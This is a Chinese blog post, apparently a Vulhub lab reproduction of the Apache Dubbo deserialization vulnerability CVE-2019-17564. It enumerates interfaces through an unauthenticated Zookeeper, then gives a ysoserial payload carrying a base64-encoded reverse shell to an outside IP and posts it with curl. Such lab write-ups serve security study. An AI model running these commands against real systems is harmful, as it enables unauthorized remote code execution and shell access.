# Aapche Dubbo Java 反序列化漏洞（CVE-2019-17564） - NoCirc1e - 博客园

> 原文：[`www.cnblogs.com/NoCirc1e/p/16275611.html`](https://www.cnblogs.com/NoCirc1e/p/16275611.html)

Apache Dubbo 是一款高性能、轻量级的开源 Java RPC 服务框架。Dubbo 可以使用不同协议通信，当使用 http 协议时，Apache Dubbo 直接使用了 Spring 框架的`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter`类做远程调用，而这个过程会读取 POST 请求的 Body 并进行反序列化，最终导致漏洞。

在 Spring 文档中，对`HttpInvokerServiceExporter`有如下描述，并不建议使用：

> WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code execution on the server during the deserialization step. As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.

这个漏洞影响 Apache Dubbo 2.7.4 及以前版本，2.7.5 后 Dubbo 使用`com.googlecode.jsonrpc4j.JsonRpcServer`替换了`HttpInvokerServiceExporter`。

参考链接：

*   [`docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html)
*   [`www.anquanke.com/post/id/198747`](https://www.anquanke.com/post/id/198747)
*   [`paper.seebug.org/1128/`](https://paper.seebug.org/1128/)

## 漏洞环境

执行如下命令启动一个 Apache Dubbo 2.7.3 Provider：

```
docker-compose up -d
```

![](img/d69a5e469b90ce43732170629e66ffc2.png)

服务启动后，访问`http://your-ip:8080`，服务器默认会返回 500 错误。

![](img/ffc5dd9d4aacc44e4f51f4b133fc59b1.png)

## 漏洞复现

利用该漏洞需要先知道目标 RPC 接口名，而 Dubbo 所有的 RPC 配置储存在 registry 中，通常使用 Zookeeper 作为 registry。如果能刚好找到目标的 Zookeeper 未授权访问漏洞，那么就可以在其中找到接口的名称与地址。

Vulhub 对外开放了 8080 端口和 2181 端口，其中 2181 即为 Zookeeper 的端口，我们本地下载[Zookeeper](https://zookeeper.apache.org/)，使用其中自带的**zkCli**即可连接到这台 Zookeeper 服务器：

```
./zkCli -server target-ip:2181
```

![](img/c6bd4433dad86e8250bfe938248c2f79.png)

连接后进入一个交互式控制台，使用`ls`即可列出其中所有节点，包括 Dubbo 相关的配置：

![](img/cc2e462be03fc7dd29cab3f6373719a7.png)

获取到 RPC 接口名为`org.vulhub.api.CalcService`。直接用 ysoserial 生成 CommonsCollections6 的 Payload 作为 POST Body 发送到`http://your-ip:8080/org.vulhub.api.CalcService`即可触发反序列化漏洞：

```
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE1MC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}" > 1.poc
curl -XPOST --data-binary @1.poc http://192.168.75.130:8080/org.vulhub.api.CalcService
```

反弹 Shell

![](img/ff85bd0b22ee75e8066310a53c97b9a3.png)